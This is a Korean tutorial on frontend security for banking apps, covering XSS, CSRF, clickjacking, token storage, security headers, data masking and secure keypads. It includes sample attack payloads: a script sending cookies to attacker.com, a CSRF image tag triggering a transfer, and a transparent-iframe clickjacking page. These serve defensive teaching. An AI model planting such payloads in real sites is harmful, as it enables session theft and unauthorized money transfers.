---
title: "금융 프론트엔드 보안"
date: "2026-07-03"
category: ["Frontend", "Security"]
description: "금융권 프론트엔드 개발자가 반드시 알아야 할 보안 개념을 정리. XSS·CSRF·클릭재킹 같은 웹 공격 유형과 방어 전략, JWT 토큰 안전한 저장 방식, HTTPS·CSP·HSTS 헤더 설정, 민감 데이터 마스킹, 금융 앱 전용 보안 요소(보안 키보드·화면 캡처 방지·인증서 피닝)까지 코드 예시와 함께 정리"
---

# 금융 프론트엔드 보안 — XSS · CSRF · 인증 · 민감 데이터 처리

---

## 0. 왜 금융 프론트엔드는 보안이 더 중요한가?

일반 웹 서비스에서의 보안 취약점은 데이터 유출이나 서비스 장애로 끝날 수 있다.  
하지만 금융 서비스에서의 보안 취약점은 **직접적인 금전 피해**로 이어진다.

| 취약점 | 일반 서비스 피해 | 금융 서비스 피해 |
|---|---|---|
| XSS | 세션 탈취, 피싱 | 계좌번호·카드번호 탈취, 무단 이체 |
| CSRF | 원치 않는 요청 발생 | 무단 송금, 비밀번호 변경 |
| 민감 데이터 노출 | 개인정보 유출 | 금융 정보 유출 → 2차 사기 |
| 중간자 공격 (MITM) | 트래픽 도청 | 인증서 탈취, 거래 위변조 |

> 국내 금융권은 **전자금융거래법**, **개인정보 보호법**, **금융보안원 가이드라인** 등 법적 규제로 보안 요건이 강제된다. 프론트엔드 개발자도 이 맥락을 이해해야 한다.

---

## 1. XSS (Cross-Site Scripting)

### 1-1. 공격 원리

공격자가 웹 페이지에 악성 스크립트를 삽입하고, 피해자의 브라우저에서 해당 스크립트가 실행되도록 유도하는 공격이다.

```
[공격 시나리오 — 금융 앱 게시판]

1. 공격자가 게시글 제목에 악성 스크립트를 삽입
   <script>
     fetch('https://attacker.com/steal?cookie=' + document.cookie);
   </script>

2. 피해자가 해당 게시글을 열람

3. 브라우저가 스크립트를 실행
   → 세션 쿠키가 공격자 서버로 전송됨
   → 공격자가 피해자 계정으로 로그인 가능
```

### 1-2. XSS 유형 3가지

| 유형 | 동작 방식 | 특징 |
|---|---|---|
| **Stored XSS** | DB에 저장된 스크립트가 조회 시 실행 | 가장 위험, 불특정 다수 피해 |
| **Reflected XSS** | URL 파라미터에 포함된 스크립트 즉시 실행 | URL 클릭 유도 필요 |
| **DOM-based XSS** | JS가 DOM을 조작하는 과정에서 실행 | 서버 응답과 무관, 탐지 어려움 |

### 1-3. 방어 전략

**① 출력 인코딩 (Output Encoding)**

사용자 입력을 HTML로 렌더링할 때 반드시 이스케이프 처리한다.

```javascript
// ❌ 위험: innerHTML에 사용자 입력 직접 삽입
element.innerHTML = userInput;

// ✅ 안전: textContent 사용 (HTML 태그를 문자열로 처리)
element.textContent = userInput;

// ✅ 안전: React는 JSX에서 자동 이스케이프
const Component = ({ userInput }) => <div>{userInput}</div>;
// userInput이 <script>... 이더라도 문자열로 렌더링됨

// ❌ React에서도 위험한 패턴
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// 꼭 필요하다면 DOMPurify로 sanitize 후 사용
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

**② Content Security Policy (CSP)**

브라우저에게 어떤 출처의 스크립트만 실행할 수 있는지 명시적으로 지시하는 HTTP 헤더다.

```http
# 가장 엄격한 CSP 설정 예시
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-랜덤값';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.mybank.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

```javascript
// Next.js에서 CSP 설정
// next.config.js
const nonce = Buffer.from(crypto.randomUUID()).toString('base64');

const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-${nonce}';
  style-src 'self' 'nonce-${nonce}';
  connect-src 'self' https://api.mybank.com;
  frame-ancestors 'none';
`;

module.exports = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [{ key: 'Content-Security-Policy', value: cspHeader }]
    }];
  }
};
```

**③ 입력값 검증**

```javascript
// 금융 도메인 입력값 검증 예시
const validators = {
  // 계좌번호: 숫자만 허용
  accountNumber: (value) => /^\d{10,14}$/.test(value),

  // 금액: 양의 정수만 허용
  amount: (value) => /^\d+$/.test(value) && parseInt(value) > 0,

  // 이름: 한글/영문만 허용 (특수문자 차단)
  name: (value) => /^[가-힣a-zA-Z\s]{1,20}$/.test(value),
};
```

---

## 2. CSRF (Cross-Site Request Forgery)

### 2-1. 공격 원리

인증된 유저의 브라우저를 이용해, 유저가 의도하지 않은 요청을 서버에 보내는 공격이다.

```
[공격 시나리오 — 무단 송금]

1. 피해자가 은행 사이트에 로그인된 상태
   (세션 쿠키가 브라우저에 저장됨)

2. 공격자가 악성 사이트로 피해자 유도
   <img src="https://mybank.com/transfer?to=attacker&amount=1000000" />

3. 브라우저가 img 태그를 로드하면서 은행 서버로 GET 요청 전송
   → 쿠키가 자동으로 포함됨
   → 은행 서버는 정상 유저 요청으로 인식해 송금 실행
```

### 2-2. 방어 전략

**① CSRF Token**

서버가 예측 불가능한 토큰을 발급하고, 모든 상태 변경 요청에 이 토큰을 포함하도록 요구한다.

```javascript
// 서버에서 발급한 CSRF 토큰을 요청 헤더에 포함
async function transfer(accountTo, amount) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

  await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,  // 커스텀 헤더는 same-origin에서만 설정 가능
    },
    body: JSON.stringify({ accountTo, amount }),
  });
}
```

**② SameSite 쿠키 설정**

```http
Set-Cookie: sessionId=abc123;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Path=/;
  Max-Age=3600
```

| SameSite 값 | 동작 | 권장 상황 |
|---|---|---|
| `Strict` | 외부 사이트 요청에 쿠키 전혀 미포함 | 금융, 고보안 서비스 |
| `Lax` | GET 요청엔 포함, POST엔 미포함 | 일반 서비스 기본값 |
| `None` | 항상 포함 (반드시 Secure와 함께) | 외부 결제 위젯 등 |

**③ Double Submit Cookie**

```javascript
// CSRF 토큰을 쿠키와 요청 본문 양쪽에 포함
// 서버는 두 값이 일치하는지 검증
const csrfToken = getCookie('csrf-token');
await fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ amount, csrfToken }),
});
```

---

## 3. 클릭재킹 (Clickjacking)

### 3-1. 공격 원리

공격자가 투명한 iframe으로 금융 사이트를 덮어씌우고, 피해자가 의도하지 않은 버튼(송금, 동의 등)을 클릭하게 유도한다.

```html
<!-- 공격자 사이트 -->
<div style="position: relative;">
  <button style="position: absolute; top: 100px; left: 200px;">
    경품 받기 👆
  </button>
  <!-- 투명한 iframe으로 은행 사이트 "송금 확인" 버튼 위에 올려놓음 -->
  <iframe
    src="https://mybank.com/transfer/confirm"
    style="opacity: 0; position: absolute; top: 0; left: 0;"
  ></iframe>
</div>
```

### 3-2. 방어 전략

```http
# X-Frame-Options: 이 페이지를 iframe에 삽입 금지
X-Frame-Options: DENY

# CSP frame-ancestors로 더 세밀하게 제어 (최신 방식)
Content-Security-Policy: frame-ancestors 'none';
```

```javascript
// Next.js에서 설정
module.exports = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      ]
    }];
  }
};
```

---

## 4. 안전한 인증 토큰 관리

### 4-1. JWT 저장 위치 비교

| 저장 위치 | XSS 취약성 | CSRF 취약성 | 권장 여부 |
|---|---|---|---|
| `localStorage` | ❌ JS로 접근 가능, XSS에 취약 | ✅ 자동 포함 안 됨 | ❌ 금융 서비스 비권장 |
| `sessionStorage` | ❌ JS로 접근 가능, XSS에 취약 | ✅ 자동 포함 안 됨 | ❌ 금융 서비스 비권장 |
| `HttpOnly Cookie` | ✅ JS 접근 불가 | ❌ 자동 포함됨 (CSRF 방어 필요) | ✅ **금융 서비스 권장** |
| 메모리 (변수) | ✅ JS 접근 어려움 | ✅ 자동 포함 안 됨 | ✅ + 탭 닫으면 소멸 |

**금융 서비스 권장 패턴: HttpOnly Cookie + CSRF Token 조합**

```
Access Token  → 메모리 (JS 변수) 에 저장
                짧은 만료 시간 (5~15분)

Refresh Token → HttpOnly Secure Cookie 에 저장
                서버에서만 접근 가능, JS 접근 불가
                만료 시간 더 길게 (1~7일)
```

```javascript
// 메모리에 Access Token 저장 (React 예시)
let accessToken = null; // 전역 변수 또는 Context

// 로그인 성공 시
function handleLoginSuccess(response) {
  // Access Token은 메모리에만 저장
  accessToken = response.data.accessToken;
  // Refresh Token은 서버가 HttpOnly 쿠키로 자동 설정
}

// API 요청 시 Access Token을 Authorization 헤더에 포함
async function apiRequest(url, options = {}) {
  if (!accessToken) {
    // 메모리에 없으면 Refresh Token으로 재발급 시도
    await refreshAccessToken();
  }

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${accessToken}`,
    },
    credentials: 'include', // HttpOnly 쿠키 자동 포함
  });
}
```

### 4-2. 토큰 만료 및 갱신 처리

```javascript
// Axios Interceptor로 토큰 만료 자동 처리
import axios from 'axios';

let isRefreshing = false;
let failedQueue = [];

axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // 이미 갱신 중이면 큐에 대기
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        }).then(() => axios(originalRequest));
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        await refreshAccessToken(); // Refresh Token으로 재발급
        failedQueue.forEach(({ resolve }) => resolve());
        return axios(originalRequest);
      } catch (e) {
        failedQueue.forEach(({ reject }) => reject(e));
        logout(); // 갱신도 실패하면 로그아웃
      } finally {
        isRefreshing = false;
        failedQueue = [];
      }
    }

    return Promise.reject(error);
  }
);
```

---

## 5. HTTPS · 보안 헤더 설정

### 5-1. HTTPS 강제 (HSTS)

```http
# HSTS: 브라우저가 이 사이트에 앞으로 1년간 HTTPS만 사용하도록 강제
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age`: HTTPS 강제 기간 (초)
- `includeSubDomains`: 서브도메인에도 적용
- `preload`: 브라우저 HSTS 사전 목록에 등록 가능

### 5-2. 금융 서비스 필수 보안 헤더 체크리스트

```http
# ① XSS 방어
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xxx'; frame-ancestors 'none';

# ② 클릭재킹 방어
X-Frame-Options: DENY

# ③ MIME 타입 스니핑 방지 (JS로 위장한 악성 파일 실행 차단)
X-Content-Type-Options: nosniff

# ④ HTTPS 강제
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# ⑤ 리퍼러 정보 제어 (이전 페이지 URL 유출 방지)
Referrer-Policy: strict-origin-when-cross-origin

# ⑥ 브라우저 기능 제어 (카메라·마이크 등 불필요한 API 차단)
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

## 6. 민감 데이터 마스킹 처리

금융 앱에서 계좌번호, 카드번호, 주민등록번호 등은 화면에 노출할 때 반드시 마스킹 처리해야 한다.

```javascript
const mask = {
  // 계좌번호: 앞 3자리 + *** + 뒤 4자리
  // "110123456789" → "110-***-6789"
  accountNumber: (value) => {
    if (!value || value.length < 7) return value;
    return value.replace(/(\d{3})\d+(\d{4})$/, '$1-***-$2');
  },

  // 카드번호: 중간 8자리 마스킹
  // "1234567890123456" → "1234-****-****-3456"
  cardNumber: (value) => {
    const cleaned = value.replace(/\D/g, '');
    return cleaned.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1-****-****-$4');
  },

  // 주민등록번호: 뒤 7자리 마스킹
  // "9001011234567" → "900101-*******"
  ssn: (value) => {
    return value.replace(/(\d{6})-?(\d{7})/, '$1-*******');
  },

  // 전화번호: 중간 4자리 마스킹
  // "01012345678" → "010-****-5678"
  phone: (value) => {
    return value.replace(/(\d{3})-?(\d{4})-?(\d{4})/, '$1-****-$3');
  },

  // 이메일: 아이디 일부 마스킹
  // "myemail@bank.com" → "my***@bank.com"
  email: (value) => {
    const [id, domain] = value.split('@');
    const masked = id.slice(0, 2) + '*'.repeat(id.length - 2);
    return `${masked}@${domain}`;
  },
};

// React 컴포넌트에서 활용
function AccountInfo({ accountNumber, isRevealed }) {
  return (
    <span>
      {isRevealed ? accountNumber : mask.accountNumber(accountNumber)}
    </span>
  );
}
```

---

## 7. 금융 앱 전용 보안 요소

### 7-1. 화면 캡처 방지

```javascript
// React Native (모바일 앱)
import { preventScreenCapture, allowScreenCapture } from 'expo-screen-capture';

// 거래 화면 진입 시 캡처 방지
useEffect(() => {
  preventScreenCapture();
  return () => allowScreenCapture(); // 화면 이탈 시 해제
}, []);
```

```javascript
// 웹: CSS로 인쇄 및 복사 방지 (완전하지 않음, 참고용)
// 실제 금융 앱은 네이티브 레이어에서 처리
@media print {
  .sensitive-data {
    display: none;
  }
}
```

### 7-2. 자동 로그아웃 (세션 타임아웃)

금융 서비스는 일정 시간 미사용 시 자동으로 로그아웃되어야 한다. (금융보안원 권고: 10분)

```javascript
// 자동 로그아웃 훅
function useAutoLogout(timeoutMs = 10 * 60 * 1000) {
  const timerRef = useRef(null);

  const resetTimer = useCallback(() => {
    clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      logout();
      alert('장시간 미사용으로 자동 로그아웃되었습니다.');
    }, timeoutMs);
  }, [timeoutMs]);

  useEffect(() => {
    // 사용자 행동 감지 이벤트
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
    events.forEach(e => window.addEventListener(e, resetTimer));
    resetTimer(); // 초기 타이머 시작

    return () => {
      clearTimeout(timerRef.current);
      events.forEach(e => window.removeEventListener(e, resetTimer));
    };
  }, [resetTimer]);
}
```

### 7-3. 보안 키보드

금융 앱에서 비밀번호, PIN 번호 입력 시 키로거(Keylogger) 공격을 방지하기 위해 보안 키보드를 사용한다.

```
[일반 키보드의 문제]
사용자 키 입력 → OS 이벤트 → 키로거 악성 소프트웨어 → 비밀번호 탈취

[보안 키보드의 원리]
1. 키패드 배열을 매번 랜덤하게 섞음 (위치 기반으로 입력)
2. 키 입력 이벤트를 OS가 아닌 앱 내부에서 처리
3. 입력값을 암호화해서 서버로 전송
```

```javascript
// 보안 키패드 컴포넌트 (웹 구현 개념)
function SecureKeypad({ onInput }) {
  // 버튼 배열을 렌더링마다 랜덤 셔플
  const [keys, setKeys] = useState(() => shuffle(['0','1','2','3','4','5','6','7','8','9']));

  const handleClick = (key) => {
    // 키 값이 아닌 암호화된 값을 전달
    const encrypted = encryptKey(key);
    onInput(encrypted);
  };

  return (
    <div
      onContextMenu={(e) => e.preventDefault()} // 우클릭 방지
      style={{ userSelect: 'none' }}             // 드래그 선택 방지
    >
      {keys.map((key) => (
        <button key={key} onMouseDown={(e) => { e.preventDefault(); handleClick(key); }}>
          {key}
        </button>
      ))}
    </div>
  );
}
```

### 7-4. 개발자 도구 탐지

```javascript
// 금융 앱에서 개발자 도구 오픈 감지 (참고용)
// 완전한 차단은 불가능하나 탐지 후 세션 종료 등에 활용
function detectDevTools() {
  const threshold = 160;

  const detect = () => {
    if (
      window.outerWidth - window.innerWidth > threshold ||
      window.outerHeight - window.innerHeight > threshold
    ) {
      // 개발자 도구가 열린 것으로 판단
      console.clear();
      logout(); // 세션 종료
    }
  };

  window.addEventListener('resize', detect);
}
```

---

## 8. 의존성 보안 (Supply Chain Attack 방어)

외부 패키지를 통한 공격은 금융 앱에서 매우 위험하다. 2021년 `ua-parser-js`, 2022년 `node-ipc` 악성 코드 삽입 사건이 실제로 있었다.

```bash
# npm audit: 알려진 취약점이 있는 패키지 탐지
npm audit
npm audit fix  # 자동 수정 가능한 것만 수정

# 특정 취약점 강제 수정
npm audit fix --force

# 패키지 무결성 검증 (package-lock.json의 integrity 해시 활용)
npm ci  # npm install 대신 ci 사용 → lock 파일 정확히 따름
```

```json
// package.json: 패키지 버전 고정 권장 (금융 앱)
{
  "dependencies": {
    "react": "18.3.1",    // ✅ 정확한 버전 고정
    "axios": "^1.7.0"     // ⚠️ ^ 사용 시 마이너 버전 자동 업데이트됨
  }
}
```

---

## 9. 보안 취약점 점검 체크리스트

금융 프론트엔드 배포 전 필수 점검 항목이다.

```
[ ] XSS
    ☐ innerHTML 대신 textContent 사용
    ☐ React dangerouslySetInnerHTML 미사용 또는 DOMPurify sanitize 적용
    ☐ CSP 헤더 설정 및 인라인 스크립트 제거

[ ] CSRF
    ☐ 상태 변경 요청에 CSRF 토큰 포함
    ☐ SameSite=Strict 쿠키 설정

[ ] 인증 / 세션
    ☐ Access Token 메모리 저장
    ☐ Refresh Token HttpOnly Cookie 저장
    ☐ 자동 로그아웃 (10분 미사용 시)
    ☐ 로그아웃 시 토큰 완전 삭제 (서버 측 무효화 포함)

[ ] 민감 데이터
    ☐ 계좌번호 · 카드번호 마스킹 처리
    ☐ console.log에 민감 데이터 출력 금지
    ☐ 네트워크 응답에 불필요한 민감 필드 제거 확인

[ ] 보안 헤더
    ☐ HSTS 설정
    ☐ X-Frame-Options: DENY
    ☐ X-Content-Type-Options: nosniff
    ☐ CSP 설정

[ ] 의존성
    ☐ npm audit 통과
    ☐ 패키지 버전 고정 (package-lock.json 커밋)

[ ] 금융 전용
    ☐ 화면 캡처 방지 적용 (거래 화면)
    ☐ 보안 키보드 적용 (PIN · 비밀번호 입력)
    ☐ 루팅 · 탈옥 단말 접근 차단 (모바일)
```

---

## 10. 금융권 취업과의 연결고리

| 보안 개념 | 금융 서비스 적용 맥락 |
|---|---|
| **XSS 방어 (CSP, 인코딩)** | 인터넷 뱅킹 · MTS 화면에서 고객 데이터 탈취 방지 |
| **CSRF 방어 (SameSite, CSRF Token)** | 무단 송금·이체 요청 방지 |
| **HttpOnly Cookie + 메모리 Token** | 세션 탈취 방지, 전자금융거래법 준수 |
| **HSTS + 보안 헤더** | MITM 공격 차단, 금융보안원 취약점 점검 대응 |
| **민감 데이터 마스킹** | 개인정보 보호법 · 금융실명법 준수 |
| **자동 로그아웃** | 금융보안원 권고 (10분 타임아웃) 준수 |
| **보안 키보드** | 키로거 방어, 금융감독원 전자금융 가이드라인 준수 |
| **npm audit · 의존성 고정** | Supply Chain Attack 방어, 금융 IT 보안 감사 대응 |

> 금융권 면접에서 "프론트엔드 보안 경험이 있나요?"라는 질문을 받을 때, 단순히 "XSS, CSRF 알아요"가 아닌 **"왜 금융 서비스에서 더 엄격한 기준이 적용되는지"**, **"각 보안 요소가 어떤 법적 규제와 연결되는지"** 설명할 수 있으면 강력한 차별점이 된다.

---

## 📎 참고 자료

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — 가장 위험한 웹 취약점 10가지
- [MDN Content Security Policy](https://developer.mozilla.org/ko/docs/Web/HTTP/CSP)
- [금융보안원 전자금융 보안 가이드](https://www.fsec.or.kr)
- [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Cheat Sheet: CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)